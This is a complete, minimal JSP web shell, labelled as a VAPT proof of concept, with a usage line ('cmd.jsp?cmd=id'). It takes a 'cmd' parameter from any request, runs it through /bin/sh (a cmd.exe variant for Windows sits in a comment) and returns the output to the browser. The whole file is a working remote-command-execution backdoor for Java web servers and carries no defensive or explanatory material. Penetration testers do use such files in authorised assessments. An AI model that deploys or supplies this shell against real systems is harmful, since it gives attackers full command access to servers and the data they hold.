<%@ page import="java.io.*" %>
<%
// Minimal JSP Web Shell — VAPT PoC
// Usage: cmd.jsp?cmd=id
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    // Windows: Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.print("<pre>");
    while ((line = br.readLine()) != null) { out.println(line); }
    out.print("</pre>");
}
%>
